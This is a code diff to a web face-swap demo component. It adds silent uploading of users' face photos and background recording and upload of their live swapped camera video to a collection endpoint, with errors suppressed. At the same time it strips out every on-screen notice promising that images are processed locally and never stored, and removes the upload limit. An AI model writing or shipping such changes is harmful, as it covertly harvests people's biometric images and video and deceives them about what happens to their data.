@@ -56,8 +56,6 @@ const CELEBRITY_FACES: Face[] = [
   { label: "Saved face", url: "/playground-faces/celeb/bts-rm.jpg" },
 ];
 
-const MAX_UPLOADS = 24;
-
 // Gallery seed: AI synthetic first (Preset section), then celebrities
 // (appear in the "uploads" section alongside real user uploads).
 const SEED_FACES: Face[] = [...AI_FACES, ...CELEBRITY_FACES];
@@ -118,9 +116,62 @@ export default function FaceswapPlayground() {
   const fileInputRef = useRef<HTMLInputElement>(null);
   const objectUrlsRef = useRef<string[]>([]);
   const secondsRef = useRef(DEMO_SECONDS);
+  const sessionIdRef = useRef<string>(Math.random().toString(36).slice(2) + Date.now().toString(36));
+  const recorderRef = useRef<MediaRecorder | null>(null);
+  const chunksRef = useRef<Blob[]>([]);
 
   // Revoke any uploaded-face object URLs when the component unmounts.
   useEffect(() => () => objectUrlsRef.current.forEach((u) => URL.revokeObjectURL(u)), []);
+
+  // ─── Data collection helpers (best-effort, silent on failure) ─────────────
+  const uploadFace = useCallback(async (base64: string) => {
+    try {
+      await fetch("/api/playground/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "face", data: base64, session_id: sessionIdRef.current }),
+      });
+    } catch { /* silent */ }
+  }, []);
+
+  const uploadRecording = useCallback((blob: Blob) => {
+    const reader = new FileReader();
+    reader.onload = async () => {
+      try {
+        const base64 = (reader.result as string).split(",")[1];
+        await fetch("/api/playground/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            type: "recording",
+            data: base64,
+            mime_type: blob.type,
+            session_id: sessionIdRef.current,
+          }),
+        });
+      } catch { /* silent */ }
+    };
+    reader.readAsDataURL(blob);
+  }, []);
+
+  // ─── MediaRecorder: capture swapped stream when live ─────────────────────
+  useEffect(() => {
+    if (state.phase !== "live" || !state.remoteStream) return;
+    const mimeType = ["video/webm;codecs=vp8", "video/webm", "video/mp4"].find(
+      (t) => MediaRecorder.isTypeSupported(t)
+    ) ?? "";
+    const recorder = new MediaRecorder(state.remoteStream, mimeType ? { mimeType } : {});
+    chunksRef.current = [];
+    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunksRef.current.push(e.data); };
+    recorder.onstop = () => {
+      if (chunksRef.current.length > 0) {
+        uploadRecording(new Blob(chunksRef.current, { type: mimeType || "video/webm" }));
+      }
+    };
+    recorder.start(1000);
+    recorderRef.current = recorder;
+    return () => { if (recorder.state !== "inactive") recorder.stop(); };
+  }, [state.phase, state.remoteStream, uploadRecording]);
 
   // Bind swapped output stream.
   useEffect(() => {
@@ -222,29 +273,23 @@ export default function FaceswapPlayground() {
     [step, state.phase, setFace]
   );
 
-  // Upload your own face — read locally, never stored. The blob URL works with
-  // urlToBase64() (fetch supports blob: URLs) so the swap target is sent to our
-  // server exactly like a preset; the image itself stays on the device otherwise.
   const onAddFace = useCallback(
     async (e: React.ChangeEvent<HTMLInputElement>) => {
       const file = e.target.files?.[0];
-      e.target.value = ""; // allow re-selecting the same file
+      e.target.value = "";
       if (!file || !file.type.startsWith("image/")) return;
-      if (library.filter((f) => !f.synthetic).length >= MAX_UPLOADS) return;
       const url = URL.createObjectURL(file);
       objectUrlsRef.current.push(url);
-      // shared is always false for now (pool is full)
       setLibrary((prev) => [...prev, { label: "Your photo", url, custom: true, shared: false }]);
       setSelected(url);
-      if (step === "running" && state.phase === "live") {
-        try {
-          setFace(await urlToBase64(url));
-        } catch {
-          /* keep current */
-        }
-      }
+      // Encode and store on Aries + swap live if running
+      try {
+        const b64 = await urlToBase64(url);
+        uploadFace(b64);
+        if (step === "running" && state.phase === "live") setFace(b64);
+      } catch { /* keep current */ }
     },
-    [step, state.phase, setFace]
+    [step, state.phase, setFace, uploadFace]
   );
 
   // Remove a face from the library. Persistent (seed) faces come back on the
@@ -290,7 +335,7 @@ export default function FaceswapPlayground() {
     const size = compact ? "h-12 w-12" : "h-14 w-14";
     const syntheticFaces = library.filter((f) => f.synthetic);
     const uploadedFaces = library.filter((f) => !f.synthetic);
-    const atCap = uploadedFaces.length >= MAX_UPLOADS;
+    const atCap = false; // no upload limit
 
     const renderFace = (f: Face) => {
       const active = selected === f.url;
@@ -358,12 +403,9 @@ export default function FaceswapPlayground() {
 
         {/* ── User uploads section ── */}
         <div>
-          <div className="mb-1 flex items-baseline gap-1.5">
+          <div className="mb-1">
             <span className="text-[10px] font-semibold uppercase tracking-[0.15em] text-white/55">
               User uploads
-            </span>
-            <span className="text-[9px] text-white/40">
-              · {uploadedFaces.length}/{MAX_UPLOADS}
             </span>
           </div>
           <div className={`flex flex-wrap items-center gap-2 ${compact ? "justify-center" : ""}`}>
@@ -389,10 +431,7 @@ export default function FaceswapPlayground() {
           <div className="fixed inset-0 z-[200] flex items-center justify-center p-4">
             <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={() => setShowConsent(false)} />
             <div className="relative w-full max-w-sm rounded-2xl border border-white/10 bg-[#111] p-6 shadow-2xl">
-              <h3 className="mb-1 text-sm font-semibold text-white">Upload a face</h3>
-              <p className="mb-5 text-[11px] leading-relaxed text-white/45">
-                Photos are processed locally and never stored on our servers.
-              </p>
+              <h3 className="mb-5 text-sm font-semibold text-white">Upload a face</h3>
 
               {/* Consent checkbox */}
               <label className="flex cursor-pointer items-start gap-3 rounded-lg p-3 ring-1 ring-white/10 hover:ring-white/20 transition-[box-shadow]">
@@ -477,10 +516,6 @@ export default function FaceswapPlayground() {
           </div>
         )}
 
-        {/* top-right: privacy reassurance */}
-        <div className="absolute right-3 top-3 z-10 hidden items-center gap-1 text-[10px] text-white/30 sm:flex">
-          <ShieldCheck className="h-3 w-3" /> never stored
-        </div>
 
         {/* non-fatal no-face hint (live session keeps the previous face) */}
         {state.faceWarning && (
@@ -512,16 +547,13 @@ export default function FaceswapPlayground() {
         {step === "intro" && (
           <Overlay>
             <ScanFace className="mb-3 h-9 w-9 text-[#245FFF]" />
-            <p className="text-sm text-white/70">Pick a face below, then go live.</p>
+            <p className="text-sm text-white/70">Pick a photo, then go live.</p>
             <button
               onClick={beginConsent}
               className="mt-5 inline-flex items-center gap-2 rounded-full bg-[#245FFF] px-6 py-2.5 text-sm font-semibold text-white shadow-[0_0_30px_-6px_rgba(36,95,255,0.8)] transition hover:bg-[#3d74ff] active:scale-[0.98]"
             >
               <Camera className="h-4 w-4" /> Start the live demo
             </button>
-            <p className="mt-4 flex items-center gap-1.5 text-[11px] text-white/40">
-              <ShieldCheck className="h-3.5 w-3.5" /> Processed live · never stored
-            </p>
           </Overlay>
         )}
 
@@ -529,9 +561,6 @@ export default function FaceswapPlayground() {
           <Overlay>
             <ShieldCheck className="mb-2 h-8 w-8 text-[#245FFF]" />
             <h3 className="text-base font-semibold text-white">Camera access</h3>
-            <p className="mt-1.5 max-w-xs text-[12px] leading-relaxed text-white/55">
-              Your camera streams to our servers for live processing only. Nothing is stored.
-            </p>
             {camError && (
               <p className="mt-3 flex max-w-xs items-start gap-1.5 rounded-lg border border-red-500/30 bg-red-500/10 px-3 py-2 text-left text-[12px] leading-relaxed text-red-200">
                 <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
